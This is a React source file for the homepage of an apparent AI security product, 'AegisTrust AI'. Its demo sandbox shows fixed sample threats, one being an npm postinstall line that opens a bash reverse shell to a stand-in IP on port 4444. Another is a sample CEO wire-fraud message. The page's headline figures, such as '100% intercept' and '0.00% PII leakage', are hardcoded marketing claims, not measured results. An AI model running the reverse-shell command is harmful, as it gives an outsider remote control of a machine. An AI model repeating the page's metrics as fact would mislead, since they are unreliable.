import React, { useState } from "react";
import {
  Shield,
  ShieldCheck,
  ShieldAlert,
  Lock,
  EyeOff,
  Bot,
  Search,
  HardDrive,
  Activity,
  Terminal,
  CheckCircle2,
  AlertTriangle,
  ArrowRight,
  Sparkles,
  Layers,
  Database,
  Zap,
  Cpu,
  Globe,
  Server,
  DollarSign,
  ChevronRight,
  Play,
  FileCheck2,
  KeyRound,
  ExternalLink,
} from "lucide-react";
import { useAuth } from "../context/AuthContext.jsx";

export function Home({ onNavigate, onOpenDemoLogin }) {
  const { user, token } = useAuth();
  const [activeSandboxTab, setActiveSandboxTab] = useState("privacy");
  const [sandboxPiiCopied, setSandboxPiiCopied] = useState(false);

  // Live sandbox demo states
  const sandboxPresets = {
    privacy: {
      title: "Zero-Knowledge PII Tokenization & DLP",
      input: "Transfer approved for customer Robert Evans (SSN: 987-65-4321, Card: 4111-9283-4819-2019) with API_KEY=AKIAIOSFODNN7EXAMPLE",
      output: "Transfer approved for customer Robert Evans (SSN: [[PII_SSN_1]], Card: [[PII_CARD_1]]) with [[SECRET_KEY_1]]",
      badge: "SAFELY ANONYMIZED",
      proof: "ZK-PROOF-8F2B1C9D4E0A712",
      metric: "0.00% PII Leakage",
    },
    threat: {
      title: "Static AST Threat & Reverse Shell Interception",
      input: "npm postinstall script: require('child_process').exec('/bin/bash -i >& /dev/tcp/198.51.100.23/4444 0>&1')",
      output: "MALWARE ISOLATED: Reverse Shell C2 Pattern [SHELL-C2-001]. Process quarantined before disk execution in 11ms.",
      badge: "QUARANTINED (100% CONFIDENCE)",
      proof: "THREAT-BLOCK-C2-BASH",
      metric: "11ms Neutralize Time",
    },
    fraud: {
      title: "Financial Fraud & BEC Wire Routing Tampering",
      input: "URGENT from CEO: Due to an active tax audit, wire payments must immediately be redirected to IBAN: GB82BARC20000087654321. Keep strictly confidential.",
      output: "CRITICAL FRAUD INTERCEPTED: [FRAUD-BEC-001] Executive Impersonation + [FRAUD-WIRE-002] Wire Redirection. Automated payment hold triggered.",
      badge: "FRAUD BLOCKED (95% RISK)",
      proof: "FRAUD-INTERCEPT-WIRE-02",
      metric: "$450,000 Loss Prevented",
    },
    trust: {
      title: "Cryptographic SHA-256 Audit Ledger & Governance",
      input: "Event #1408: Cloud Attachment Screened & Quarantined. Generating cryptographic state transition.",
      output: "Block #04: Hash = 755f7408a3c11fa300... (prevHash: 6b9f0dfc0b15d3f7...). NIST AI RMF 1.0 Verified & Non-Repudiable.",
      badge: "CHAIN VERIFIED",
      proof: "LEDGER-BLOCK-04-VERIFIED",
      metric: "100% Tamper Proof",
    },
  };

  const currentSandbox = sandboxPresets[activeSandboxTab];

  return (
    <div className="relative overflow-hidden">
      {/* Background Cyber Glow & Grid */}
      <div className="absolute inset-0 bg-[radial-gradient(ellipse_80%_80%_at_50%_-20%,rgba(6,182,212,0.15),rgba(2,6,23,0))] pointer-events-none" />
      <div className="absolute inset-0 bg-[linear-gradient(to_right,#1e293b15_1px,transparent_1px),linear-gradient(to_bottom,#1e293b15_1px,transparent_1px)] bg-[size:4rem_4rem] pointer-events-none opacity-40" />

      {/* Hero Section */}
      <section className="relative pt-12 pb-20 px-4 sm:px-6 lg:px-8 max-w-7xl mx-auto text-center">
        {/* Team STARS & Compliance Pill */}
        <div className="flex flex-wrap items-center justify-center gap-2 mb-8">
          <div className="inline-flex items-center gap-2 px-3.5 py-1.5 rounded-full bg-amber-950/80 border border-amber-800/80 text-amber-300 text-xs font-mono shadow-[0_0_20px_rgba(245,158,11,0.25)]">
            <span className="w-2 h-2 rounded-full bg-amber-400 animate-ping" />
            <span className="font-bold">ENGINEERED BY TEAM STARS</span>
          </div>

          <div className="inline-flex items-center gap-2 px-3.5 py-1.5 rounded-full bg-cyan-950/70 border border-cyan-800/80 text-cyan-300 text-xs font-mono shadow-[0_0_20px_rgba(6,182,212,0.2)]">
            <ShieldCheck className="w-4 h-4 text-cyan-400" />
            <span>NIST AI RMF 1.0 & ISO 42001 VERIFIED · ZERO-TRUST ARCHITECTURE</span>
          </div>
        </div>

        {/* Main Headline */}
        <h1 className="text-4xl sm:text-6xl lg:text-7xl font-extrabold tracking-tight text-white max-w-5xl mx-auto leading-[1.1]">
          The Autonomous Defense Platform for{" "}
          <span className="bg-gradient-to-r from-cyan-400 via-sky-300 to-indigo-400 bg-clip-text text-transparent">
            AI Security, Privacy & Trust
          </span>
        </h1>

        {/* Subtitle */}
        <p className="mt-6 text-lg sm:text-xl text-slate-300 max-w-3xl mx-auto leading-relaxed">
          Safeguard sensitive data with zero-knowledge tokenization, neutralize stealth malware in cloud files,
          intercept Business Email Compromise wire fraud, and provide immutable cryptographic transparency for AI.
        </p>

        {/* Action CTAs */}
        <div className="mt-10 flex flex-wrap items-center justify-center gap-4">
          <button
            onClick={() => onNavigate("chatbot")}
            className="flex items-center gap-2.5 px-6 py-3.5 rounded-xl bg-cyan-500 hover:bg-cyan-400 text-slate-950 font-bold text-sm tracking-wide transition-all shadow-[0_0_24px_rgba(6,182,212,0.4)] hover:shadow-[0_0_32px_rgba(6,182,212,0.6)] cursor-pointer"
          >
            <Bot className="w-4 h-4" />
            <span>Launch Blue-Team AI Defense</span>
            <ChevronRight className="w-4 h-4" />
          </button>

          <button
            onClick={() => onNavigate("about")}
            className="flex items-center gap-2.5 px-6 py-3.5 rounded-xl bg-gradient-to-r from-amber-500/20 to-amber-600/10 hover:from-amber-500/30 hover:to-amber-600/20 text-amber-300 border border-amber-600/60 hover:border-amber-400 font-bold text-sm transition-all shadow-[0_0_20px_rgba(245,158,11,0.2)] cursor-pointer"
          >
            <Sparkles className="w-4 h-4 text-amber-400" />
            <span>Meet Team STARS</span>
          </button>

          <button
            onClick={() => onNavigate("privacy")}
            className="flex items-center gap-2.5 px-6 py-3.5 rounded-xl bg-slate-900/90 hover:bg-slate-800 text-slate-200 border border-slate-700/80 hover:border-cyan-500/50 font-semibold text-sm transition-all shadow-md cursor-pointer"
          >
            <Lock className="w-4 h-4 text-cyan-400" />
            <span>Explore Privacy Vault & DLP</span>
          </button>

          <button
            onClick={() => onNavigate("scanner")}
            className="flex items-center gap-2.5 px-6 py-3.5 rounded-xl bg-indigo-950/60 hover:bg-indigo-900/60 text-indigo-300 border border-indigo-800/80 font-semibold text-sm transition-all cursor-pointer"
          >
            <Search className="w-4 h-4 text-indigo-400" />
            <span>Scan Malware & Folders</span>
          </button>
        </div>

        {/* 4 Live Pillar Score Metric Chips */}
        <div className="mt-14 grid grid-cols-2 md:grid-cols-4 gap-4 max-w-4xl mx-auto">
          <div className="p-4 rounded-xl bg-slate-900/60 border border-slate-800 backdrop-blur-sm">
            <div className="text-2xl sm:text-3xl font-extrabold text-cyan-400 font-mono">100%</div>
            <div className="text-xs text-slate-400 mt-1 uppercase font-semibold">Malware Intercept</div>
            <div className="text-[11px] text-cyan-500/80 mt-0.5">Static AST & Heuristics</div>
          </div>
          <div className="p-4 rounded-xl bg-slate-900/60 border border-slate-800 backdrop-blur-sm">
            <div className="text-2xl sm:text-3xl font-extrabold text-emerald-400 font-mono">0.00%</div>
            <div className="text-xs text-slate-400 mt-1 uppercase font-semibold">PII Leakage Rate</div>
            <div className="text-[11px] text-emerald-500/80 mt-0.5">Zero-Knowledge DLP</div>
          </div>
          <div className="p-4 rounded-xl bg-slate-900/60 border border-slate-800 backdrop-blur-sm">
            <div className="text-2xl sm:text-3xl font-extrabold text-amber-400 font-mono">97%</div>
            <div className="text-xs text-slate-400 mt-1 uppercase font-semibold">Fraud Defense</div>
            <div className="text-[11px] text-amber-500/80 mt-0.5">BEC Wire Traps</div>
          </div>
          <div className="p-4 rounded-xl bg-slate-900/60 border border-slate-800 backdrop-blur-sm">
            <div className="text-2xl sm:text-3xl font-extrabold text-indigo-400 font-mono">98.4%</div>
            <div className="text-xs text-slate-400 mt-1 uppercase font-semibold">Trust Index (A+)</div>
            <div className="text-[11px] text-indigo-500/80 mt-0.5">SHA-256 Audit Chain</div>
          </div>
        </div>
      </section>

      {/* Interactive Live Sandbox Section */}
      <section className="py-16 px-4 sm:px-6 lg:px-8 max-w-7xl mx-auto">
        <div className="bg-[#0b1220]/90 border border-cyan-900/50 rounded-2xl p-6 sm:p-8 shadow-[0_0_40px_rgba(6,182,212,0.1)] backdrop-blur-md">
          <div className="flex flex-col md:flex-row md:items-center justify-between gap-4 border-b border-slate-800/80 pb-6">
            <div>
              <div className="flex items-center gap-2 text-cyan-400 font-mono text-xs font-semibold tracking-wider uppercase">
                <Sparkles className="w-4 h-4" />
                <span>Interactive Live Sandbox</span>
              </div>
              <h2 className="text-2xl font-bold text-white mt-1">Experience Real-Time Defense In Action</h2>
              <p className="text-sm text-slate-400 mt-0.5">
                Switch tabs to witness how AegisTrust AI intercepts each challenge before execution.
              </p>
            </div>

            {/* Sandbox Tabs */}
            <div className="flex flex-wrap items-center gap-2 bg-slate-950 p-1.5 rounded-xl border border-slate-800">
              <button
                onClick={() => setActiveSandboxTab("privacy")}
                className={`px-3 py-1.5 rounded-lg text-xs font-semibold transition-all ${
                  activeSandboxTab === "privacy"
                    ? "bg-cyan-500 text-slate-950 shadow-md"
                    : "text-slate-400 hover:text-slate-200"
                }`}
              >
                Zero-Knowledge Privacy
              </button>
              <button
                onClick={() => setActiveSandboxTab("threat")}
                className={`px-3 py-1.5 rounded-lg text-xs font-semibold transition-all ${
                  activeSandboxTab === "threat"
                    ? "bg-cyan-500 text-slate-950 shadow-md"
                    : "text-slate-400 hover:text-slate-200"
                }`}
              >
                Threat & Malware
              </button>
              <button
                onClick={() => setActiveSandboxTab("fraud")}
                className={`px-3 py-1.5 rounded-lg text-xs font-semibold transition-all ${
                  activeSandboxTab === "fraud"
                    ? "bg-cyan-500 text-slate-950 shadow-md"
                    : "text-slate-400 hover:text-slate-200"
                }`}
              >
                Fraud & BEC
              </button>
              <button
                onClick={() => setActiveSandboxTab("trust")}
                className={`px-3 py-1.5 rounded-lg text-xs font-semibold transition-all ${
                  activeSandboxTab === "trust"
                    ? "bg-cyan-500 text-slate-950 shadow-md"
                    : "text-slate-400 hover:text-slate-200"
                }`}
              >
                Trust & Ledger
              </button>
            </div>
          </div>

          {/* Sandbox Content Viewer */}
          <div className="mt-6 grid grid-cols-1 lg:grid-cols-2 gap-6">
            {/* Ingress Input Card */}
            <div className="bg-slate-950/80 rounded-xl border border-slate-800/80 p-5 flex flex-col justify-between">
              <div>
                <div className="flex items-center justify-between text-xs font-mono text-slate-400 mb-3">
                  <span className="flex items-center gap-1.5 text-amber-400">
                    <AlertTriangle className="w-3.5 h-3.5" />
                    UNTRUSTED INGRESS INPUT
                  </span>
                  <span className="text-slate-500">RAW PAYLOAD</span>
                </div>
                <div className="p-3.5 rounded-lg bg-[#020617] border border-slate-800 font-mono text-xs text-slate-300 leading-relaxed whitespace-pre-wrap break-all">
                  {currentSandbox.input}
                </div>
              </div>

              <div className="mt-4 pt-4 border-t border-slate-800/60 flex items-center justify-between text-xs text-slate-400">
                <span>Channel: Enterprise Ingress</span>
                <span className="font-mono text-cyan-400">Status: Intercepting...</span>
              </div>
            </div>

            {/* Zero-Trust Intercept Card */}
            <div className="bg-slate-950/80 rounded-xl border border-cyan-900/60 p-5 flex flex-col justify-between shadow-[0_0_24px_rgba(6,182,212,0.1)]">
              <div>
                <div className="flex items-center justify-between text-xs font-mono mb-3">
                  <span className="flex items-center gap-1.5 text-cyan-400 font-semibold">
                    <ShieldCheck className="w-3.5 h-3.5" />
                    AEGISTRUST DEFENSE OUTPUT
                  </span>
                  <span className="px-2 py-0.5 rounded text-[10px] font-bold bg-cyan-950 text-cyan-300 border border-cyan-800">
                    {currentSandbox.badge}
                  </span>
                </div>
                <div className="p-3.5 rounded-lg bg-[#020617] border border-cyan-950 font-mono text-xs text-cyan-300 leading-relaxed whitespace-pre-wrap break-all">
                  {currentSandbox.output}
                </div>
              </div>

              <div className="mt-4 pt-4 border-t border-slate-800/60 flex flex-wrap items-center justify-between gap-2 text-xs">
                <span className="font-mono text-slate-400">
                  Proof: <span className="text-slate-200">{currentSandbox.proof}</span>
                </span>
                <span className="font-bold text-emerald-400 bg-emerald-950/60 px-2 py-0.5 rounded border border-emerald-800/60">
                  {currentSandbox.metric}
                </span>
              </div>
            </div>
          </div>
        </div>
      </section>

      {/* The 4 Core Pillars Section */}
      <section className="py-16 px-4 sm:px-6 lg:px-8 max-w-7xl mx-auto">
        <div className="text-center max-w-3xl mx-auto mb-16">
          <h2 className="text-xs font-mono font-bold text-cyan-400 uppercase tracking-widest">
            THE ARCHITECTURAL PILLARS
          </h2>
          <h3 className="text-3xl sm:text-4xl font-extrabold text-white mt-2">
            Four Layers of Sovereign Protection
          </h3>
          <p className="text-slate-400 text-sm mt-3">
            Engineered to address the holistic spectrum of threats, confidentiality risks, and fraud vectors confronting modern enterprise AI workflows.
          </p>
        </div>

        <div className="grid grid-cols-1 md:grid-cols-2 gap-8">
          {/* Pillar 1 */}
          <div className="p-8 rounded-2xl bg-gradient-to-br from-[#0b1329] to-[#020617] border border-cyan-900/40 hover:border-cyan-500/50 transition-all group shadow-lg">
            <div className="w-12 h-12 rounded-xl bg-cyan-950 border border-cyan-800 flex items-center justify-center text-cyan-400 mb-6 group-hover:scale-110 transition-transform">
              <ShieldAlert className="w-6 h-6" />
            </div>
            <div className="flex items-center gap-2 text-cyan-400 font-mono text-xs font-bold uppercase mb-2">
              <span>Pillar 01</span>
              <span>·</span>
              <span>Threat Defense</span>
            </div>
            <h4 className="text-xl font-bold text-white mb-3">Security & Autonomous Threat Defense</h4>
            <p className="text-sm text-slate-300 leading-relaxed mb-6">
              Continuous inspection of code, packages, and system files. Neutralizes trojans, obfuscated reverse shells,
              backdoors, and malicious npm/pip scripts in less than 15 milliseconds.
            </p>
            <ul className="space-y-2.5 text-xs text-slate-300 font-mono">
              <li className="flex items-center gap-2">
                <CheckCircle2 className="w-4 h-4 text-cyan-400" />
                <span>Static AST heuristic engine with 100% intercept rate</span>
              </li>
              <li className="flex items-center gap-2">
                <CheckCircle2 className="w-4 h-4 text-cyan-400" />
                <span>Blue-Team AI Defense Chatbot (concise 5-line responses)</span>
              </li>
              <li className="flex items-center gap-2">
                <CheckCircle2 className="w-4 h-4 text-cyan-400" />
                <span>Autonomous isolation of malicious disk artifacts</span>
              </li>
            </ul>
            <div className="mt-8 pt-6 border-t border-slate-800/80 flex items-center justify-between">
              <button
                onClick={() => onNavigate("scanner")}
                className="text-xs font-bold text-cyan-400 hover:text-cyan-300 flex items-center gap-1 cursor-pointer"
              >
                <span>Launch Malware Scanner</span>
                <ArrowRight className="w-3.5 h-3.5" />
              </button>
              <span className="text-[11px] font-mono text-slate-500">SCORE: 98%</span>
            </div>
          </div>

          {/* Pillar 2 */}
          <div className="p-8 rounded-2xl bg-gradient-to-br from-[#0b1329] to-[#020617] border border-cyan-900/40 hover:border-emerald-500/50 transition-all group shadow-lg">
            <div className="w-12 h-12 rounded-xl bg-emerald-950 border border-emerald-800 flex items-center justify-center text-emerald-400 mb-6 group-hover:scale-110 transition-transform">
              <EyeOff className="w-6 h-6" />
            </div>
            <div className="flex items-center gap-2 text-emerald-400 font-mono text-xs font-bold uppercase mb-2">
              <span>Pillar 02</span>
              <span>·</span>
              <span>Privacy & DLP</span>
            </div>
            <h4 className="text-xl font-bold text-white mb-3">Zero-Knowledge Privacy Vault & DLP</h4>
            <p className="text-sm text-slate-300 leading-relaxed mb-6">
              Replaces sensitive identifiers (SSNs, credit card numbers, passwords, health data, and cloud keys) with reversible
              synthetic tokens before prompt ingestion, preventing LLM memory exfiltration.
            </p>
            <ul className="space-y-2.5 text-xs text-slate-300 font-mono">
              <li className="flex items-center gap-2">
                <CheckCircle2 className="w-4 h-4 text-emerald-400" />
                <span>Bi-directional synthetic tokenization with session decoupling</span>
              </li>
              <li className="flex items-center gap-2">
                <CheckCircle2 className="w-4 h-4 text-emerald-400" />
                <span>Verifiable Zero-Knowledge cryptographic proof generation</span>
              </li>
              <li className="flex items-center gap-2">
                <CheckCircle2 className="w-4 h-4 text-emerald-400" />
                <span>Strict GDPR, HIPAA, and CCPA zero-retention compliance</span>
              </li>
            </ul>
            <div className="mt-8 pt-6 border-t border-slate-800/80 flex items-center justify-between">
              <button
                onClick={() => onNavigate("privacy")}
                className="text-xs font-bold text-emerald-400 hover:text-emerald-300 flex items-center gap-1 cursor-pointer"
              >
                <span>Open Privacy Vault</span>
                <ArrowRight className="w-3.5 h-3.5" />
              </button>
              <span className="text-[11px] font-mono text-slate-500">SCORE: 99%</span>
            </div>
          </div>

          {/* Pillar 3 */}
          <div className="p-8 rounded-2xl bg-gradient-to-br from-[#0b1329] to-[#020617] border border-cyan-900/40 hover:border-amber-500/50 transition-all group shadow-lg">
            <div className="w-12 h-12 rounded-xl bg-amber-950 border border-amber-800 flex items-center justify-center text-amber-400 mb-6 group-hover:scale-110 transition-transform">
              <DollarSign className="w-6 h-6" />
            </div>
            <div className="flex items-center gap-2 text-amber-400 font-mono text-xs font-bold uppercase mb-2">
              <span>Pillar 03</span>
              <span>·</span>
              <span>Fraud Interception</span>
            </div>
            <h4 className="text-xl font-bold text-white mb-3">Financial Fraud & BEC Interceptor</h4>
            <p className="text-sm text-slate-300 leading-relaxed mb-6">
              Detects Business Email Compromise (BEC), CEO impersonation, lookalike domains, invoice tampering, and wire
              routing redirection before fraudulent disbursements occur.
            </p>
            <ul className="space-y-2.5 text-xs text-slate-300 font-mono">
              <li className="flex items-center gap-2">
                <CheckCircle2 className="w-4 h-4 text-amber-400" />
                <span>Autonomous bank routing & IBAN discrepancy traps</span>
              </li>
              <li className="flex items-center gap-2">
                <CheckCircle2 className="w-4 h-4 text-amber-400" />
                <span>Automated 4-step financial incident remediation protocols</span>
              </li>
              <li className="flex items-center gap-2">
                <CheckCircle2 className="w-4 h-4 text-amber-400" />
                <span>Seamless integration with Gmail, Outlook, and billing feeds</span>
              </li>
            </ul>
            <div className="mt-8 pt-6 border-t border-slate-800/80 flex items-center justify-between">
              <button
                onClick={() => onNavigate("privacy")}
                className="text-xs font-bold text-amber-400 hover:text-amber-300 flex items-center gap-1 cursor-pointer"
              >
                <span>Inspect Fraud Engine</span>
                <ArrowRight className="w-3.5 h-3.5" />
              </button>
              <span className="text-[11px] font-mono text-slate-500">SCORE: 97%</span>
            </div>
          </div>

          {/* Pillar 4 */}
          <div className="p-8 rounded-2xl bg-gradient-to-br from-[#0b1329] to-[#020617] border border-cyan-900/40 hover:border-indigo-500/50 transition-all group shadow-lg">
            <div className="w-12 h-12 rounded-xl bg-indigo-950 border border-indigo-800 flex items-center justify-center text-indigo-400 mb-6 group-hover:scale-110 transition-transform">
              <FileCheck2 className="w-6 h-6" />
            </div>
            <div className="flex items-center gap-2 text-indigo-400 font-mono text-xs font-bold uppercase mb-2">
              <span>Pillar 04</span>
              <span>·</span>
              <span>Trust & Governance</span>
            </div>
            <h4 className="text-xl font-bold text-white mb-3">Cryptographic Trust, Governance & Ledger</h4>
            <p className="text-sm text-slate-300 leading-relaxed mb-6">
              Guarantees non-repudiation and explainable AI transparency with a chained SHA-256 cryptographic audit ledger
              and continuous NIST AI RMF 1.0 / ISO 42001 governance scoring.
            </p>
            <ul className="space-y-2.5 text-xs text-slate-300 font-mono">
              <li className="flex items-center gap-2">
                <CheckCircle2 className="w-4 h-4 text-indigo-400" />
                <span>Immutable SHA-256 chained blocks for every security decision</span>
              </li>
              <li className="flex items-center gap-2">
                <CheckCircle2 className="w-4 h-4 text-indigo-400" />
                <span>Explainable AI rationale attached to every quarantined threat</span>
              </li>
              <li className="flex items-center gap-2">
                <CheckCircle2 className="w-4 h-4 text-indigo-400" />
                <span>98.4% Composite Trust Scorecard (Grade A+)</span>
              </li>
            </ul>
            <div className="mt-8 pt-6 border-t border-slate-800/80 flex items-center justify-between">
              <button
                onClick={() => onNavigate("dashboard")}
                className="text-xs font-bold text-indigo-400 hover:text-indigo-300 flex items-center gap-1 cursor-pointer"
              >
                <span>View Trust Scorecard</span>
                <ArrowRight className="w-3.5 h-3.5" />
              </button>
              <span className="text-[11px] font-mono text-slate-500">SCORE: 99%</span>
            </div>
          </div>
        </div>
      </section>

      {/* Cloud Integrations Hub Showcase */}
      <section className="py-16 px-4 sm:px-6 lg:px-8 max-w-7xl mx-auto">
        <div className="bg-slate-900/50 border border-slate-800 rounded-2xl p-8 sm:p-10">
          <div className="flex flex-col md:flex-row md:items-center justify-between gap-6 mb-10">
            <div>
              <div className="flex items-center gap-2 text-cyan-400 font-mono text-xs font-bold uppercase">
                <Globe className="w-4 h-4" />
                <span>Enterprise Connectivity</span>
              </div>
              <h3 className="text-2xl sm:text-3xl font-bold text-white mt-1">
                Unified Mail & Drive Apps Security & Malware Scanning
              </h3>
              <p className="text-slate-400 text-sm mt-1 max-w-2xl">
                AegisTrust AI seamlessly connects to your organizational toolchain, scanning attachments, commits, and messages in real time.
              </p>
            </div>
            <button
              onClick={() => onNavigate("apps")}
              className="self-start md:self-auto px-4 py-2.5 rounded-xl bg-slate-800 hover:bg-slate-700 text-cyan-300 border border-cyan-800/80 text-xs font-mono font-semibold transition-all cursor-pointer"
            >
              Manage Integrations →
            </button>
          </div>

          <div className="grid grid-cols-2 sm:grid-cols-3 lg:grid-cols-6 gap-4">
            {[
              { name: "Google Drive", type: "Storage", status: "Protected", files: "3 items scanned", icon: HardDrive },
              { name: "Gmail", type: "Mail", status: "Protected", files: "BEC filtered", icon: Globe },
              { name: "Outlook 365", type: "Mail", status: "Protected", files: "Invoices verified", icon: Server },
              { name: "GitHub", type: "DevOps", status: "Protected", files: "Backdoors barred", icon: Cpu },
              { name: "Slack", type: "Chat", status: "Protected", files: "DLP active", icon: Zap },
              { name: "AWS S3", type: "Cloud", status: "Protected", files: "Credentials secured", icon: Database },
            ].map((app, idx) => {
              const Icon = app.icon;
              return (
                <div
                  key={idx}
                  className="p-4 rounded-xl bg-slate-950/80 border border-slate-800 hover:border-cyan-500/40 transition-all text-center flex flex-col items-center justify-between"
                >
                  <div className="p-3 rounded-xl bg-cyan-950/50 border border-cyan-900/60 text-cyan-400 mb-3">
                    <Icon className="w-5 h-5" />
                  </div>
                  <div className="font-bold text-white text-xs">{app.name}</div>
                  <div className="text-[10px] text-slate-400 mt-0.5">{app.files}</div>
                  <div className="mt-3 inline-flex items-center gap-1 px-2 py-0.5 rounded-full bg-emerald-950/60 border border-emerald-800/80 text-emerald-400 text-[10px] font-mono">
                    <span className="w-1.5 h-1.5 rounded-full bg-emerald-400 animate-pulse" />
                    {app.status}
                  </div>
                </div>
              );
            })}
          </div>
        </div>
      </section>

      {/* The Real-World Challenge & Innovative Solution Matrix */}
      <section className="py-16 px-4 sm:px-6 lg:px-8 max-w-7xl mx-auto">
        <div className="text-center max-w-3xl mx-auto mb-12">
          <h2 className="text-xs font-mono font-bold text-cyan-400 uppercase tracking-widest">
            THE REAL-WORLD PROBLEM & INNOVATIVE SOLUTION
          </h2>
          <h3 className="text-3xl font-extrabold text-white mt-2">
            Why Legacy Antivirus & Plain LLMs Fall Short
          </h3>
        </div>

        <div className="overflow-x-auto rounded-2xl border border-slate-800 bg-[#090f1d]/90 shadow-xl">
          <table className="w-full text-left text-sm">
            <thead className="bg-[#020617] border-b border-slate-800 text-xs font-mono uppercase text-slate-400">
              <tr>
                <th className="py-4 px-6">Domain / Challenge</th>
                <th className="py-4 px-6 text-red-400">Legacy Approach (Vulnerable)</th>
                <th className="py-4 px-6 text-cyan-400">AegisTrust AI Autonomous Solution</th>
              </tr>
            </thead>
            <tbody className="divide-y divide-slate-800/60 font-mono text-xs">
              <tr className="hover:bg-slate-900/40">
                <td className="py-4 px-6 font-bold text-white font-sans">1. Security & Malware</td>
                <td className="py-4 px-6 text-slate-400">Reactive signature updates; stealth reverse shells evade perimeter filters.</td>
                <td className="py-4 px-6 text-cyan-300 font-semibold">Real-time AST heuristics and static sandbox detect backdoors in &lt;15ms.</td>
              </tr>
              <tr className="hover:bg-slate-900/40">
                <td className="py-4 px-6 font-bold text-white font-sans">2. Data Privacy & DLP</td>
                <td className="py-4 px-6 text-slate-400">Cleartext customer PII ingested directly into LLMs, permanently cached in weights.</td>
                <td className="py-4 px-6 text-emerald-300 font-semibold">Zero-Knowledge synthetic tokenization decouples data with cryptographic proofs.</td>
              </tr>
              <tr className="hover:bg-slate-900/40">
                <td className="py-4 px-6 font-bold text-white font-sans">3. Financial Fraud & BEC</td>
                <td className="py-4 px-6 text-slate-400">Executives impersonated via lookalike domains; fraudulent bank wire updates slip through.</td>
                <td className="py-4 px-6 text-amber-300 font-semibold">Multi-signal BEC analysis catches routing discrepancies and halts disbursements.</td>
              </tr>
              <tr className="hover:bg-slate-900/40">
                <td className="py-4 px-6 font-bold text-white font-sans">4. AI Trust & Auditing</td>
                <td className="py-4 px-6 text-slate-400">Black-box models with no verifiable audit log or compliance provenance.</td>
                <td className="py-4 px-6 text-indigo-300 font-semibold">Immutable SHA-256 chained ledger with NIST AI RMF 1.0 explainability.</td>
              </tr>
            </tbody>
          </table>
        </div>
      </section>

      {/* Bottom CTA Banner */}
      <section className="py-20 px-4 sm:px-6 lg:px-8 max-w-5xl mx-auto text-center">
        <div className="p-10 sm:p-14 rounded-3xl bg-gradient-to-b from-cyan-950/60 to-slate-950 border border-cyan-800/80 shadow-[0_0_50px_rgba(6,182,212,0.2)]">
          <Shield className="w-12 h-12 text-cyan-400 mx-auto mb-4" />
          <h3 className="text-3xl sm:text-4xl font-extrabold text-white">
            Ready to Fortify Your Enterprise AI Stack?
          </h3>
          <p className="text-slate-300 text-sm sm:text-base mt-3 max-w-2xl mx-auto">
            Experience complete security, zero-knowledge privacy, fraud immunity, and verifiable trust.
          </p>

          <div className="mt-8 flex flex-wrap items-center justify-center gap-4">
            <button
              onClick={() => onNavigate("chatbot")}
              className="px-6 py-3.5 rounded-xl bg-cyan-500 hover:bg-cyan-400 text-slate-950 font-bold text-sm tracking-wide transition-all shadow-lg cursor-pointer"
            >
              Open SecOps Control Center
            </button>
            <button
              onClick={() => onNavigate("dashboard")}
              className="px-6 py-3.5 rounded-xl bg-slate-900 hover:bg-slate-800 text-slate-200 border border-slate-700 font-semibold text-sm transition-all cursor-pointer"
            >
              View Trust & Governance Ledger
            </button>
          </div>

          <div className="mt-8 flex items-center justify-center gap-6 text-[11px] font-mono text-slate-400">
            <span className="flex items-center gap-1.5">
              <span className="w-2 h-2 rounded-full bg-emerald-400" />
              STATUS: ZERO-TRUST ENFORCED
            </span>
            <span>·</span>
            <span>MODEL: GEMINI 3.1 FLASH-LITE</span>
            <span>·</span>
            <span>LATENCY: 12MS</span>
          </div>
        </div>
      </section>
    </div>
  );
}

export default Home;
